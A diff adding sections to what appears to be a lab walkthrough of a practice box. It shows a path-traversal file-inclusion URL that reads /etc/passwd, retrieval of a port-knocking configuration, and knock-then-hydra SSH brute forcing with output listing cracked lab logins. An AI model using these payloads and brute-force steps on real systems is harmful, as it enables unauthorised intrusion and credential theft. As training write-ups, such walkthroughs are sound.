@@ -433,4 +433,51 @@ Since this is a linux box, the `/etc/passwd` file should exist
 
 The path is ultimately found at: `http://<ip-address>/manage.php?file=../../../../etc/passwd`
 
-![image](https://user-images.githubusercontent.com/90442032/206894750-0758d4ad-8fde-49f7-b1ac-d81035b70a7c.png)
+![image](https://user-images.githubusercontent.com/90442032/207045621-c684edb5-f57e-45ef-9517-0bfb614c1bd6.png)
+
+☝️ Perform repetitive tasks by capturing the request in **Burp Suite** and **Send to Repeater **
+
+# 5. Finding the knockd.conf
+
+Now that we gained the ability to read files on the target, the next question is what to read?
+
+The OSCP official guide points towards [Apache Log Poisoning through LFI](https://www.hackingarticles.in/apache-log-poisoning-through-lfi/) method to get code execution capabilities, but this doesn't seem to work here
+
+Taking a step back, we have a list of usernames and passwords from the SQL injection that correlates to the usernames in `/etc/passwd`
+
+But the SSH port is `filtered` → this points towarods the existence of a firewall rule that block this port
+
+But every server needs a method of administration, how would administration be done if SSH is blocked? → this points towarods the existence of [port-knock server](https://manpages.debian.org/bullseye/knockd/knockd.1.en.html)
+
+Let's check for the default knockd configuration file at `/etc/knockd.conf`
+
+![image](https://user-images.githubusercontent.com/90442032/207047786-a7bb3104-1d3a-4140-9a2b-5ba0bf41c227.png)
+
+Bingo! The port knock sequence is `7469 8475 9842`
+
+# 6. Looking for SSH login
+
+Combined use of `knock` and `hydra` found 3 functional logins to SSH
+
+```console
+┌──(root㉿kali)-[~]
+└─# knock 10.0.88.33 7469 8475 9842
+
+┌──(root㉿kali)-[~]
+└─# hydra -L users.txt -P passwords.txt ssh://10.0.88.33 -V -t 10
+Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-12-12 20:14:23
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 10 tasks per 1 server, overall 10 tasks, 289 login tries (l:17/p:17), ~29 tries per task
+[DATA] attacking ssh://10.0.88.33:22/
+⋮
+[22][ssh] host: 10.0.88.33   login: chandlerb   password: UrAG0D!
+⋮
+[22][ssh] host: 10.0.88.33   login: joeyt   password: Passw0rd
+⋮
+[22][ssh] host: 10.0.88.33   login: janitor   password: Ilovepeepee
+⋮
+1 of 1 target successfully completed, 3 valid passwords found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-12-12 20:15:43
+```
